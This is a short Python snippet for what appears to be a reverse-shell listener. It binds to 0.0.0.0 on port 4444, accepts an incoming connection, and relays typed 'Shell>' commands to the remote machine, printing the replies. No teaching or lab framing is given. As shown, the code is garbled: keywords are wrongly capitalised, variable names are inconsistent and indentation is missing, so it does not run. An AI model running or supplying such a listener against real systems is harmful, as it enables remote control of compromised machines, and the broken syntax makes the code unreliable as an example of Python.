import socket
Def start_listener(ip, port):
Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Server.bind((ip, port))
Server.listen(5)
Print(f"[*] Listening on {ip}:{port}")
Conn, addr = server.accept()
Print(f"[*] Connection from {addr}")
While True:
Cmd = input("Shell> ")
Conn.send(cmd.encode())
Response = conn.recv(4096).decode()
Print(response)
Start_listener("0.0.0.0", 4444)
